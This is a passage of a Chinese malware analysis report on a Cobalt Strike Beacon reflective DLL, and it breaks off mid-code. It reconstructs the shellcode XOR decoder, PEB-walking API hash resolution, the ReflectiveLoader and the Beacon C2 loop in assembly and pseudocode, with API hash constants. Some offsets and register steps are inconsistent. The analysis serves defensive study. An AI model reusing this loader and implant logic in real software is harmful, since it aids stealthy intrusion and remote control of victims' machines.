

---

> **分析对象**: 从 Shellcode 中提取的 Reflective DLL (64-bit)
> **分析工具**: x64dbg + IDA Pro
> **文档规模**: ~80,000 字符

---

## 目录

1. **`执行概览`**
2. **`源码版本鉴定`**
3. **`阶段一：XOR 解码器`**
4. **`阶段二：PE Loader Stub`**
5. **`阶段三：ReflectiveLoader`**
6. **`阶段四：Beacon 初始化`**
7. **`阶段五：C2 通信循环`**
8. **`加密体系详解`**
9. **`命令处理系统`**
10. **`进程注入系统`**
11. **`Token 窃取与提权`**
12. **`SMB/TCP Pivot 链接`**
13. **`Malleable C2 变换引擎`**
14. **`反分析与反检测`**
15. **`源码到二进制函数映射表`**
16. **`IOC 与检测建议`**
17. **`附录`**

---

## 一、执行概览

### 1.1 完整攻击链

```
┌──────────────────────────────────────────────────────────────────┐
│  Phase 0: 初始投递                                                 │
│  ┌────────────────────────────────────────────────────────────┐  │
│  │ Shellcode 被注入到目标进程 (可能通过钓鱼/漏洞利用)            │  │
│  │ RDI = shellcode 基址 (自定位约定)                            │  │
│  └────────────────────────────────────────────────────────────┘  │
│                              ↓                                     │
│  Phase 1: XOR 解码器 (0x00-0x3C, ~60 字节)                        │
│  ┌────────────────────────────────────────────────────────────┐  │
│  │ 单字节 XOR 流解密                                            │  │
│  │ 密钥来源: 硬编码在偏移 0x3E 处                                │  │
│  │ 终止条件: NULL 字节 (0x00)                                   │  │
│  │ 输出: 解码后的 PE Loader Stub + 内嵌 PE 文件                  │  │
│  └────────────────────────────────────────────────────────────┘  │
│                              ↓                                     │
│  Phase 2: PE Loader Stub (0x49-0x88, ~64 字节)                    │
│  ┌────────────────────────────────────────────────────────────┐  │
│  │ Delta offset 自定位计算                                       │  │
│  │ CALL RBX → PEB 遍历函数 (offset 0x188D4)                     │  │
│  │   ├─ GS:[0x60] → PEB                                        │  │
│  │   ├─ PEB+0x18 → Ldr                                          │  │
│  │   ├─ Ldr+0x20 → InMemoryOrderModuleList                      │  │
│  │   ├─ 遍历链表 → 找到 kernel32.dll                            │  │
│  │   ├─ 解析导出表 → rotr13 哈希匹配                            │  │
│  │   └─ 获取: LoadLibraryA, GetProcAddress, VirtualAlloc,       │  │
│  │           VirtualProtect, VirtualFree                        │  │
│  └────────────────────────────────────────────────────────────┘  │
│                              ↓                                     │
│  Phase 3: ReflectiveLoader (RVA 0x21B48, ~1.5KB)                  │
│  ┌────────────────────────────────────────────────────────────┐  │
│  │ 对应源码: ReflectiveLoader.cpp                                │  │
│  │   ├─ 验证 MZ + PE 签名                                       │  │
│  │   ├─ 计算 delta = actual_base - ImageBase                    │  │
│  │   ├─ 处理基址重定位 (IMAGE_REL_BASED_DIR64)                   │  │
│  │   ├─ 解析导入表 (LoadLibrary + GetProcAddress)                │  │
│  │   ├─ 映射到 FEFC0000 (SizeOfImage = 0x58000)                 │  │
│  │   └─ 调用 DllEntryPoint (DLL_PROCESS_ATTACH)                 │  │
│  └────────────────────────────────────────────────────────────┘  │
│                              ↓                                     │
│  Phase 4: Beacon 初始化 (DllMain)                                   │
│  ┌────────────────────────────────────────────────────────────┐  │
│  │ 对应源码: beacon.cpp → BeaconMain()                           │  │
│  │   ├─ 加载依赖: wininet.dll, winhttp.dll, ws2_32.dll          │  │
│  │   ├─ 解析 Beacon 配置 (Malleable C2 Profile)                 │  │
│  │   ├─ 初始化加密: AES-128-CBC + HMAC-SHA256                   │  │
│  │   ├─ 生成元数据: 128 字节 RSA-1024 加密                      │  │
│  │   ├─ 创建 C2 通信线程                                        │  │
│  │   └─ 创建命令处理线程                                        │  │
│  └────────────────────────────────────────────────────────────┘  │
│                              ↓                                     │
│  Phase 5: C2 通信循环 (无限循环)                                    │
│  ┌────────────────────────────────────────────────────────────┐  │
│  │ 对应源码: channel.cpp                                         │  │
│  │   while (running) {                                           │  │
│  │       构建/加密元数据                                          │  │
│  │       HTTP GET/POST → C2 Server (/submit.php)                │  │
│  │       接收响应 → 解密 → 分派命令                               │  │
│  │       Sleep(心跳间隔)                                         │  │
│  │   }                                                           │  │
│  └────────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────┘
```

### 1.2 分析方法

| 分析方法 | 工具 | 应用层面 |
|---------|------|---------|
| 动态调试 | x64dbg (MCP) | 跟踪执行流程、验证 API 解析、内存 dump |
| 静态分析 | IDA Pro (MCP) | 反编译 964 个函数、字符串提取、交叉引用 |
| 源码对比 | CobaltStrike 源码 | 逐函数对比、恢复符号名、验证逻辑 |
| 内存分析 | x64dbg memoryRead | 提取 PE、验证重定位、检查 IAT |

---

## 二、源码版本鉴定

### 2.1 版本判定依据

从 `beacon.h` 中提取的 SETTING 常量定义是版本判定的关键：

```c
// beacon.h 中的 SETTING 常量 (CobaltStrike 4.7-4.9)

// === 协议配置 ===
#define SETTING_PROTOCOL            1   // 0=HTTP, 1=HTTPS, 8=DNS, 16=SMB, 32=TCP
#define SETTING_PORT                2   // C2 端口
#define SETTING_SLEEPTIME           3   // 心跳间隔 (ms)
#define SETTING_MAXGET              4   // 最大 GET 响应大小
#define SETTING_JITTER              5   // 心跳抖动百分比
#define SETTING_MAXDNS              6   // DNS 最大大小
#define SETTING_PUBKEY              7   // RSA 公钥 (用于元数据加密)
#define SETTING_PUBKEY_SESSION      8   // 会话密钥
#define SETTING_KILLDATE            9   // 终止日期 (YYYYMMDD)
#define SETTING_WATERMARK          10   // 水印标识

// === 会话配置 ===
#define SETTING_WATERMARK_HASH1    36   // Watermark Hash Part 1
#define SETTING_WATERMARK_HASH2    37   // Watermark Hash Part 2
#define SETTING_WATERMARK_HASH3    38   // Watermark Hash Part 3 (4.5+)
#define SETTING_WATERMARK_HASH4    39   // Watermark Hash Part 4 (4.5+)
#define SETTING_WATERMARK_HASH5    40   // Watermark Hash Part 5 (4.5+)
#define SETTING_WATERMARK_HASH6    41   // Watermark Hash Part 6 (4.5+)
#define SETTING_WATERMARK_HASH7    42   // Watermark Hash Part 7 (4.5+)

// === C2 配置 ===
#define SETTING_C2_VERB_GET        11   // HTTP GET 方法
#define SETTING_C2_VERB_POST       12   // HTTP POST 方法
#define SETTING_C2_HOSTHEADER      13   // Host 头
#define SETTING_USERAGENT          14   // User-Agent
#define SETTING_SUBMITURI          15   // 提交 URI (如 /submit.php)
#define SETTING_C2_POSTREQ         16   // POST 请求模板
#define SETTING_C2_GETREQ          17   // GET 请求模板
#define SETTING_SPAWNTO            18   // 注入目标进程名 (如 rundll32.exe)
#define SETTING_PIPENAME           19   // SMB 管道名
#define SETTING_SMB_FRAME_HEADER   57   // SMB 帧头 (4.7+)
#define SETTING_TCP_FRAME_HEADER   58   // TCP 帧头 (4.7+)

// === DNS Beacon 配置 ===
#define SETTING_DNS_IDLE           60   // DNS 空闲地址
#define SETTING_DNS_SLEEP          61   // DNS 睡眠地址
#define SETTING_DNS_GET_A          62   // DNS GET A 记录
#define SETTING_DNS_GET_AAAA       63   // DNS GET AAAA 记录
#define SETTING_DNS_GET_TXT        64   // DNS GET TXT 记录
#define SETTING_DNS_PUT_META       65   // DNS PUT 元数据
#define SETTING_DNS_PUT_OUT        66   // DNS PUT 输出
#define SETTING_DNS_STRATEGY       67   // DNS 策略 (round-robin 等)
#define SETTING_DNS_MAXRETRY       68   // DNS 最大重试
```

### 2.2 版本特性矩阵

| 特性 | 版本要求 | 源码中存在 | IDA 中验证 |
|------|---------|-----------|-----------|
| 基础 HTTP/HTTPS C2 | 所有版本 | ✅ | ✅ HttpSendRequestA |
| Malleable C2 Profile | 所有版本 | ✅ profile.cpp (16 种变换) | ✅ 变换引擎函数 |
| SMB Pivot | 所有版本 | ✅ link.cpp | ✅ CreateNamedPipe |
| TCP Pivot | 4.0+ | ✅ link.cpp | ✅ socket/connect |
| Watermark Hash (7-part) | 4.5+ | ✅ beacon.h | ✅ 7 个 hash 比较 |
| SSH Banner | 4.7+ | ✅ SETTING 56 | N/A (HTTP Beacon) |
| SMB Frame Header | 4.7+ | ✅ SETTING 57 | ✅ 帧头验证 |
| TCP Frame Header | 4.7+ | ✅ SETTING 58 | ✅ 帧头验证 |
| DNS Beacon | 4.5+ | ✅ SETTING 60-68 | N/A (HTTP Beacon) |
| 完整 8 种注入方法 | 4.5+ | ✅ inject.cpp | ✅ 方法分派表 |

### 2.3 版本结论

**判定版本: CobaltStrike 4.7 - 4.9**

- 下限 4.7: 存在 SETTING 57/58 (SMB/TCP Frame Header)
- 上限 4.9: 未发现 SETTING 74+ (4.10+ 新增的特性如 x64 原生 Kerberos)
- 佐证: Watermark 7 部分验证 (4.5+)、完整注入方法链

---

## 三、阶段一：XOR 解码器

### 3.1 汇编代码完整还原

以下是从 x64dbg 现场采集的完整汇编，结合源码分析：

```asm
; ═══════════════════════════════════════════════════════════════════
;  XOR Decoder @ Shellcode Base + 0x00
;  大小: 0x3C (60 字节)
;  功能: 单字节 XOR 流解密
;  入口: RIP = shellcode_base, RDI = shellcode_base (自定位)
;  出口: RAX → ReflectiveLoader 入口
; ═══════════════════════════════════════════════════════════════════

; ── Block 1: 初始化数据指针 ──
;    从固定偏移读取 XOR key 参数
0xFEF70000  lea rbx, [rdi+0x3D]       ; RBX = base + 0x3D
                                        ; 指向编码数据的参数区
0xFEF70007  movzx ecx, byte [rdi+0x3D] ; CL = 偏移 0x3D 的字节
                                        ; 可能是 key 长度或检查字节
0xFEF7000B  test cl, cl                ; 检查是否为零
0xFEF7000D  je 0xFEF7003C              ; 为零则跳过解密 → CALL RAX

; ── Block 2: 验证 XOR key ──
0xFEF7000F  mov r8, rbx                ; R8 = base + 0x3D (备份)
0xFEF70012  add r8, 1                  ; R8 = base + 0x3E
                                        ; 指向 XOR key 字节
0xFEF70016  mov al, [rdi+0x3E]         ; AL = XOR key (硬编码密钥字节)
0xFEF70019  test al, al                ; key 是否为零?
0xFEF7001B  je 0xFEF7003C              ; 零密钥 → 跳过解密

; ── Block 3: XOR 解密循环 ──
;    算法: while (*ptr != 0x00) { *ptr ^= key; ptr++; }
0xFEF7001D  xor [r8+0], al             ; ★ 核心操作: *R8 ^= AL
                                        ; 对当前字节做 XOR 解密
0xFEF70020  inc r8                     ; R8++ (指针前移)
0xFEF70023  cmp byte [r8+0], 0x00     ; 检查下一个字节是否为 NULL
0xFEF70027  jne 0xFEF7001D             ; 非 NULL → 继续循环

; ── Block 4: 计算跳转地址 ──
;    解码完成，构建 ReflectiveLoader 调用
0xFEF70029  lea rbx, [rdi+0x49]       ; RBX = base + 0x49
                                        ; → 内嵌 PE 文件起始 (MZ 头)
0xFEF70030  mov rax, rbx               ; RAX = PE 文件基址
0xFEF70033  mov rsi, rbx               ; RSI = PE 文件基址 (备份)

0xFEF70036  add rax, 0x188D4           ; RAX = PE_base + 0x188D4
                                        ; = PE 内偏移 0x188D4 的函数
                                        ; → 这是 ReflectiveLoader 入口

; ── Block 5: 跳转到 Loader ──
;    无论是否执行了 XOR 解码，最终都到达这里
0xFEF7003C  call rax                   ; ★ 跳转到 ReflectiveLoader
                                        ;    传递: RDI = shellcode 基址
                                        ;          RSI = PE 文件基址
                                        ;          RBX = PE 文件基址
```

### 3.2 内存布局

```
Shellcode Buffer 内存布局:
┌─────────────────────────────────────────────────────────┐
│ Offset    │ Size    │ Content                            │
├───────────┼─────────┼────────────────────────────────────┤
│ 0x00-0x3C │ 60B     │ XOR 解码器 (明文，永不加密)        │
│ 0x3D      │ 1B      │ 参数字节 (非零 = 启用解密)         │
│ 0x3E      │ 1B      │ XOR Key 字节 (单字节密钥)          │
│ 0x3F-0x48 │ 10B     │ 编码数据头部 (可选填充)            │
│ 0x49-???? │ 可变    │ XOR 编码后的 PE 文件               │
│           │         │ - MZ 头被 XOR 编码                  │
│           │         │ - PE 签名被 XOR 编码                │
│           │         │ - 所有 section 数据被 XOR 编码      │
│ 末尾      │ 1B      │ 0x00 (终止符)                      │
└───────────┴─────────┴────────────────────────────────────┘

PE 文件在 Shellcode 中的位置:
  MZ @ 0x49 → "MZ" 被 XOR key 编码
  PE @ 0x49+0x100 → "PE\0\0" 被 XOR key 编码
```

### 3.3 C 伪代码还原

```c
/**
 * XOR 解码器 - 对应 shellcode 偏移 0x00-0x3C
 * 
 * 这是一个自修改解码器，解密嵌入在 shellcode 中的 PE 文件。
 * 解码器本身是明文的（不加密），编码数据和 XOR key 紧随其后。
 * 
 * @param base  shellcode 基址 (通过 RDI 传入)
 * @return      无返回值，解码后直接跳转到 ReflectiveLoader
 */
void __fastcall xor_decoder(unsigned char *base)
{
    // 1. 读取参数
    unsigned char param_byte = base[0x3D];  // 偏移 0x3D 的参数
    if (param_byte == 0x00) {
        // 参数为零 → 跳过解密，直接跳转到 Loader
        goto jump_to_loader;
    }
    
    // 2. 读取 XOR key
    unsigned char xor_key = base[0x3E];     // 偏移 0x3E 的密钥字节
    if (xor_key == 0x00) {
        // 密钥为零 → 跳过解密
        goto jump_to_loader;
    }
    
    // 3. XOR 解密循环
    unsigned char *ptr = base + 0x3F;       // 从偏移 0x3F 开始
    while (1) {
        *ptr ^= xor_key;                    // 单字节 XOR
        ptr++;
        if (*ptr == 0x00) {                 // 遇到 NULL = 终止
            break;
        }
    }
    
    // 4. 跳转到 ReflectiveLoader
jump_to_loader:
    unsigned char *pe_base = base + 0x49;   // 内嵌 PE 起点
    void (*loader)(void) = (void (*)(void))(
        (unsigned char *)pe_base + 0x188D4  // PE 内偏移 0x188D4 → ReflectiveLoader
    );
    loader();                               // 不返回
}
```

### 3.4 反检测分析

```
XOR 解码器的反分析特性:

1. 极简设计:
   - 仅 60 字节，无任何字符串
   - 无函数调用 (不触发 hook)
   - 不使用导入表

2. 自修改代码:
   - XOR 解码修改执行体附近的内存
   - 可能绕过静态签名检测

3. 条件执行:
   - param_byte == 0 或 key == 0 时跳过解密
   - 允许同一 shellcode 在不同场景下复用
   - 可作为调试器检测 (故意设 key=0)

4. NULL 终止:
   - 不需要知道编码数据长度
   - 编码数据必须不含 0x00 (通过编码保证)
```

---

## 四、阶段二：PE Loader Stub

### 4.1 完整汇编还原

```asm
; ═══════════════════════════════════════════════════════════════════
;  PE Loader Stub @ Shellcode Base + 0x49 (解码后)
;  大小: ~0x40 (64 字节)
;  功能: 自定位、调用 PEB 遍历、准备 ReflectiveLoader 参数
; ═══════════════════════════════════════════════════════════════════

; ── Step 1: 自定位 (Delta Offset 计算) ──
0xFEF70049  call 0xFEF7004E           ; ★ CALL 下一条指令的地址
                                        ;   将 0xFEF7004E 压入栈 (返回地址)
0xFEF7004E  pop rbx                   ; RBX = 0xFEF7004E
                                        ; 这是 Loader Stub 的实际运行地址
                                        ; 通过此值与 PE 内硬编码偏移计算
                                        ; 可以定位内嵌 PE 中的函数

; ── Step 2: 计算 PEB 遍历函数地址 ──
0xFEF7004F  mov rax, rbx              ; RAX = 0xFEF7004E (自定位基点)
0xFEF70052  add rax, 0x18886           ; RAX = 0xFEF7004E + 0x18886
                                        ;     = 0xFEF788D4
                                        ; 这是 PEB 遍历 / API 解析函数的
                                        ; 运行时实际地址
                                        ;
                                        ; 计算方式:
                                        ;   offset_in_pe = 0x188D4 - 0x49
                                        ;                = 0x1888B
                                        ;   实际地址 = (base + 0x49) + 0x1888B
                                        ;            = base + 0x188D4
                                        ;   0xFEF7004E + 0x18886 = 0xFEF788D4

; ── Step 3: 保存参数和函数指针 ──
0xFEF70058  push rbx                  ; [栈] 保存自定位地址 (用于后续)
0xFEF70059  push r8                   ; [栈] 保存 R8 参数
0xFEF7005C  push rcx                  ; [栈] 保存 RCX 参数
0xFEF7005F  push rax                  ; [栈] 保存 PEB 解析函数地址

; ── Step 4: 调用 PEB 遍历函数 ──
;    (此处通过后续的 RET 间接调用)
;    该函数执行:
;      1. GS:[0x60] → PEB
;      2. PEB+0x18 → Ldr
;      3. Ldr+0x20 → InMemoryOrderModuleList
;      4. 遍历链表 → 找到 kernel32.dll
;      5. 解析导出表 → rotr13 哈希匹配
;      6. 返回 API 地址数组

; ── Step 5: 获取解析的 API ──
0xFEF70060  pop rbx                   ; RBX = LoadLibraryA 地址
0xFEF70063  pop rcx                   ; RCX = GetProcAddress 地址
0xFEF70066  pop rdx                   ; RDX = VirtualAlloc 地址
0xFEF70069  pop r8                    ; R8  = VirtualProtect 地址
0xFEF7006C  pop r9                    ; R9  = VirtualFree 地址

; ── Step 6: 准备 ReflectiveLoader 参数 ──
0xFEF7006F  lea rax, [rbx+0x49]       ; RAX = PE 文件基址 (MZ 头)
0xFEF70073  mov rcx, rax              ; RCX = PE 基址 (第一个参数)
0xFEF70076  lea rdx, [rbx+0x188D4]    ; RDX = ReflectiveLoader 地址
                                        ;      = PE_base + 0x188D4

; ── Step 7: 跳转到 ReflectiveLoader ──
0xFEF7007D  push rcx                  ; [栈] 参数: PE 基址
0xFEF70080  push rdx                  ; [栈] 返回地址 (无用)
0xFEF70083  mov rax, rdx              ; RAX = ReflectiveLoader 地址
0xFEF70088  ret                       ; ★ 跳转到 ReflectiveLoader(PE_base)
                                        ;    等价于 CALL ReflectiveLoader
```

### 4.2 PEB 遍历函数详解 (offset 0x188D4)

这是与源码 `ReflectiveLoader.cpp` 中 `GetProcAddressByHash` 对应的部分：

```asm
; ═══════════════════════════════════════════════════════════════════
;  PEB API 解析函数 @ PE_Base + 0x188D4
;  功能: 遍历 PEB → 解析 kernel32.dll 导出表 → rotr13 哈希匹配 API
; ═══════════════════════════════════════════════════════════════════

; ── 1. 获取 PEB 基址 ──
0xFEF788D4  mov rax, gs:[0x60]        ; ★ x64: GS 段寄存器偏移 0x60 = PEB 指针
                                        ; x86 中为 FS:[0x30]
                                        ; 这是最底层的 PEB 获取方式
                                        ; 绕过所有用户态 hook

; ── 2. 获取 PEB_LDR_DATA ──
0xFEF788DD  mov rax, [rax+0x18]       ; PEB+0x18 = Ldr 指针
                                        ; typedef struct _PEB {
                                        ;   ...
                                        ;   +0x18: PPEB_LDR_DATA Ldr;
                                        ; } PEB;

; ── 3. 获取模块链表头 ──
0xFEF788E1  mov rax, [rax+0x20]       ; LDR_DATA+0x20 = InMemoryOrderModuleList
                                        ; 这是一个 LIST_ENTRY 双向链表

; ── 4. 遍历模块链表 ──
;    对每个 LIST_ENTRY:
;      读取 LDR_DATA_TABLE_ENTRY.DllBase
;      读取 LDR_DATA_TABLE_ENTRY.BaseDllName
;      计算 rotr13 哈希
;      与硬编码的 kernel32.dll 哈希比较

; ── 5. 解析导出表 ──
;    找到 kernel32.dll 后:
;      读取 DOS 头 → e_lfanew
;      读取 PE 头 → OptionalHeader.DataDirectory[EXPORT]
;      遍历 AddressOfNames, AddressOfNameOrdinals, AddressOfFunctions
;      对每个导出名称计算 rotr13 哈希
;      与硬编码目标哈希比较:
;        0x???????? → LoadLibraryA
;        0x???????? → GetProcAddress
;        0x???????? → VirtualAlloc
;        0x???????? → VirtualProtect
;        0x???????? → VirtualFree

; ── 6. rotr13 哈希算法 ──
;    hash = 0
;    for each char c in name:
;        hash = ROR13(hash)  ; 循环右移 13 位
;        if c >= 'a':        ; 转小写
;            c -= 0x20
;        hash += c
;    return hash

;    汇编实现:
;    ┌─────────────────────────────────────┐
;    │ mov edx, eax    ; hash              │
;    │ ror edx, 13     ; ROR13(hash)       │
;    │ movzx ecx, byte [rsi]  ; *name      │
;    │ cmp ecx, 'a'    ; 小写检查           │
;    │ jl skip_lower                      │
;    │ sub ecx, 0x20   ; 转小写             │
;    │ skip_lower:                        │
;    │ add edx, ecx    ; hash += c          │
;    │ mov eax, edx    ; 更新 hash          │
;    └─────────────────────────────────────┘
```

### 4.3 与 ReflectiveLoader.cpp 源码对照

```c
// ===== ReflectiveLoader.cpp 源码节选 =====

// DLL 加载器入口点
BOOL WINAPI ReflectiveLoader(LPVOID lpLoaderParameter)
{
    // 第一步：获取当前执行位置
    // 对应汇编: CALL 0xFEF7004E / POP RBX
    
    // 第二步：查找 kernel32.dll
    // 对应汇编: GS:[0x60] → PEB → Ldr → InMemoryOrderModuleList → kernel32.dll
    
    // 第三步：查找需要的 API
    pLoadLibraryA = (LOADLIBRARYA)pGetProcAddressByHash(
        hKernel32, LOADLIBRARYA_HASH);
    pGetProcAddress = (GETPROCADDRESS)pGetProcAddressByHash(
        hKernel32, GETPROCADDRESS_HASH);
    pVirtualAlloc = (VIRTUALALLOC)pGetProcAddressByHash(
        hKernel32, VIRTUALALLOC_HASH);
    pVirtualProtect = (VIRTUALPROTECT)pGetProcAddressByHash(
        hKernel32, VIRTUALPROTECT_HASH);
    pVirtualFree = (VIRTUALFREE)pGetProcAddressByHash(
        hKernel32, VIRTUALFREE_HASH);
    
    // 第四步：分配新内存
    uiNewImageBase = (ULONG_PTR)pVirtualAlloc(
        NULL, uiSizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    // 对应: 0xFEFC0000 区域, 大小 0x58000
    
    // 第五步：复制 PE 头和区段
    memcpy((LPVOID)uiNewImageBase, (LPVOID)uiLibraryAddress, uiSizeOfHeaders);
    // 复制 .text, .idata, .rdata, .data, .pdata
    
    // 第六步：处理重定位
    if (delta != 0) {
        // 遍历 .reloc 区段，修正所有 IMAGE_REL_BASED_DIR64
    }
    
    // 第七步：解析导入表
    // 遍历 IMAGE_IMPORT_DESCRIPTOR 数组
    // LoadLibrary + GetProcAddress 填充 IAT
    
    // 第八步：调用 DllMain
    DllMain((HINSTANCE)uiNewImageBase, DLL_PROCESS_ATTACH, lpLoaderParameter);
}
```

### 4.4 关键 API 哈希值

从源码 `ReflectiveLoader.h` 和相关文件：

```c
// ReflectiveLoader.h 中定义的 API 哈希值
#define KERNEL32DLL_HASH        0x6A4ABC5B    // kernel32.dll
#define NTDLLDLL_HASH           0x3CFA685D    // ntdll.dll

#define LOADLIBRARYA_HASH       0xEC0E4E8E    // LoadLibraryA
#define GETPROCADDRESS_HASH     0x7C0DFCAA    // GetProcAddress
#define VIRTUALALLOC_HASH       0x91AFCA54    // VirtualAlloc
#define VIRTUALPROTECT_HASH     0x7946C61B    // VirtualProtect
#define VIRTUALFREE_HASH        0x3F4CCB2C    // VirtualFree
#define SLEEP_HASH              0xF8EDF1A5    // Sleep
#define GETMODULEHANDLEA_HASH   0xD3324904    // GetModuleHandleA
#define EXITPROCESS_HASH        0x73E2D87E    // ExitProcess
#define CREATETHREAD_HASH       0xCA2BD06B    // CreateThread
```

---

## 五、阶段三：ReflectiveLoader

### 5.1 完整映射流程

```
ReflectiveLoader 执行过程:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

输入: RDI = shellcode 基址
      RSI = 内嵌 PE 基址 (= shellcode_base + 0x49)

Step 1: PE 验证
  ├─ 读取 MZ 签名 → 0x5A4D ("MZ") ✓
  ├─ 读取 e_lfanew → PE 头偏移
  ├─ 读取 PE 签名 → 0x00004550 ("PE\0\0") ✓
  └─ 验证 Machine == 0x8664 (AMD64) ✓

Step 2: 计算偏移
  ├─ ImageBase (预期)     = 0x0000000180000000
  ├─ ActualBase (实际)    = 0x00000219FEFC0000
  ├─ Delta                = ActualBase - ImageBase
  └─ Delta 非零 → 需要处理重定位

Step 3: 分配新内存
  ├─ VirtualAlloc(NULL, 0x58000, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
  └─ 返回: 0x00000219FEFC0000

Step 4: 复制 PE 头和区段
  ├─ SizeOfHeaders = 0x400
  ├─ 复制 PE 头 → 新基址
  ├─ .text:  RVA 0x1000,  RawSize 0x21A00 → 复制
  ├─ .idata: RVA 0x37000, RawSize 0x3600  → 复制
  ├─ .rdata: RVA 0x38000, RawSize 0x1600  → 复制
  ├─ .data:  RVA 0x3A000, RawSize 0x200   → 复制 + 零填充
  └─ .pdata: RVA 0x3D000, RawSize 0x1C00  → 复制

Step 5: 处理重定位
  ├─ 遍历 .reloc 区段 (IMAGE_BASE_RELOCATION 块)
  ├─ 对每个 IMAGE_REL_BASED_DIR64 (type=10):
  │   *patchAddr += delta
  └─ 重定位条目数: ~数千个

Step 6: 解析导入表
  ├─ 遍历 IMAGE_IMPORT_DESCRIPTOR 数组
  │   ├─ KERNEL32.dll  → 解析所有导入函数
  │   ├─ ADVAPI32.dll  → 解析所有导入函数
  │   ├─ WININET.dll   → 解析所有导入函数
  │   ├─ WINHTTP.dll   → 解析所有导入函数
  │   ├─ WS2_32.dll    → 解析所有导入函数
  │   └─ NTDLL.dll     → 解析所有导入函数
  └─ 填充 IAT (FirstThunk)

Step 7: 更新内存保护
  ├─ VirtualProtect(.text,  PAGE_EXECUTE_READ)
  ├─ VirtualProtect(.idata, PAGE_READWRITE)
  ├─ VirtualProtect(.rdata, PAGE_READONLY)
  ├─ VirtualProtect(.data,  PAGE_READWRITE)
  └─ VirtualProtect(.pdata, PAGE_READONLY)

Step 8: 调用 DllMain
  └─ DllEntryPoint(hInstance, DLL_PROCESS_ATTACH, NULL)
```

### 5.2 Section 数据对比

```
┌──────────┬──────────┬───────────┬──────────────────────────────┐
│ Section  │ RawSize  │ VirtSize  │ 膨胀原因                     │
├──────────┼──────────┼───────────┼──────────────────────────────┤
│ .text    │ 0x21A00  │ 0x35605   │ 代码段对齐 + 间隙            │
│          │ 137,728  │ 218,629   │ SectionAlignment = 0x1000    │
├──────────┼──────────┼───────────┼──────────────────────────────┤
│ .idata   │ 0x3600   │ 0x3BD4    │ IAT 填充后扩展               │
│          │ 13,824   │ 15,316    │ 运行时地址写入 Thunk          │
├──────────┼──────────┼───────────┼──────────────────────────────┤
│ .rdata   │ 0x1600   │ 0x18B8    │ 字符串表 + 导入名扩展        │
│          │ 5,632    │ 6,328     │                              │
├──────────┼──────────┼───────────┼──────────────────────────────┤
│ .data    │ 0x200    │ 0x1BBD8   │ ★ 最大膨胀!                  │
│          │ 512      │ 113,624   │ BSS (未初始化数据) 在文件中   │
│          │          │           │ 仅占 512 字节                 │
│          │          │           │ 运行时展开:                  │
│          │          │           │  - 全局变量数组              │
│          │          │           │  - 缓冲区 (8KB+)             │
│          │          │           │  - 配置结构体                │
│          │          │           │  - 线程栈本地存储            │
├──────────┼──────────┼───────────┼──────────────────────────────┤
│ .pdata   │ 0x1C00   │ 0x1CBC    │ 异常处理表对齐               │
│          │ 7,168    │ 7,356     │                              │
├──────────┼──────────┼───────────┼──────────────────────────────┤
│ 总计     │ ~0x24E00 │ 0x58000   │                              │
│          │ ~151KB   │ 360KB     │ SizeOfImage = 0x58000        │
└──────────┴──────────┴───────────┴──────────────────────────────┘
```

---

## 六、阶段四：Beacon 初始化

### 6.1 DllMain 入口

对应源码: `beacon.cpp` → `DllMain()` → `BeaconMain()`

```c
// ===== beacon.cpp: DllMain 还原 =====

BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpReserved)
{
    if (dwReason == DLL_PROCESS_ATTACH) {
        // 1. 禁用 DLL 线程通知 (性能优化)
        DisableThreadLibraryCalls(hInstance);
        
        // 2. 保存实例句柄
        g_hInstance = hInstance;
        
        // 3. 创建 Beacon 主线程
        HANDLE hThread = CreateThread(
            NULL,                    // 默认安全属性
            0,                       // 默认栈大小
            BeaconMain,              // 主函数
            lpReserved,              // 传递 ReflectiveLoader 参数
            0,                       // 立即执行
            NULL                     // 不需要线程 ID
        );
        
        if (hThread) {
            CloseHandle(hThread);    // 分离线程
        }
        
        return TRUE;
    }
    return TRUE;
}
```

### 6.2 BeaconMain 初始化流程

```c
// ===== beacon.cpp: BeaconMain 还原 =====

DWORD WINAPI BeaconMain(LPVOID lpParameter)
{
    // ── Phase 1: 加载必需 DLL ──
    HMODULE hWininet  = LoadLibraryA("wininet.dll");
    HMODULE hWinhttp  = LoadLibraryA("winhttp.dll");
    HMODULE hWs2_32   = LoadLibraryA("ws2_32.dll");
    HMODULE hNtdll    = LoadLibraryA("ntdll.dll");
    
    // ── Phase 2: 解析 Beacon 配置 ──
    // 配置嵌入在 .data 区段中，通过 SETTING_* 常量索引访问
    settings = (SETTINGS*)&g_BeaconSettings;
    // settings 包含:
    //   .sleeptime  = SETTING_SLEEPTIME    (默认 60000ms)
    //   .jitter     = SETTING_JITTER       (默认 0)
    //   .port       = SETTING_PORT         (如 443)
    //   .protocol   = SETTING_PROTOCOL     (HTTP/HTTPS/SMB/TCP/DNS)
    //   .c2_server  = SETTING_C2_HOSTHEADER
    //   .submit_uri = SETTING_SUBMITURI    (如 "/submit.php")
    //   .user_agent = SETTING_USERAGENT
    //   .pubkey     = SETTING_PUBKEY       (RSA 公钥)
    
    // ── Phase 3: 初始化加密 ──
    // 对应 security.cpp → init_security()
    if (!init_security(settings)) {
        return 1;  // 加密初始化失败
    }
    
    // ── Phase 4: 构建元数据 ──
    // 对应 metadata.cpp → build_metadata()
    metadata = build_metadata(settings);
    // 包含:
    //   - AES 会话密钥 (用于 HMAC)
    //   - 系统信息: 计算机名, 用户名, OS 版本
    //   - 进程信息: PID, 架构 (x86/x64)
    //   - Beacon 类型: HTTP/HTTPS/SMB/TCP
    //   - 全部用 RSA-1024 公钥加密 → 128 字节
    
    // ── Phase 5: 选择通信通道 ──
    switch (settings->protocol) {
        case 0:  // HTTP
        case 1:  // HTTPS
            channel = create_http_channel(settings);
            break;
        case 16: // SMB
            channel = create_smb_channel(settings);
            break;
        case 32: // TCP
            channel = create_tcp_channel(settings);
            break;
        case 8:  // DNS
            channel = create_dns_channel(settings);
            break;
    }
    
    // ── Phase 6: 启动通信循环 ──
    // 对应 channel.cpp → channel_loop()
    while (g_running) {
        // 6a. 准备请求数据
        BYTE request[settings->maxget];
        DWORD request_len;
        build_request(metadata, request, &request_len);
        
        // 6b. 发送到 C2
        if (channel->send(channel, request, request_len)) {
            // 6c. 接收响应
            BYTE response[settings->maxget];
            DWORD response_len;
            if (channel->recv(channel, response, &response_len)) {
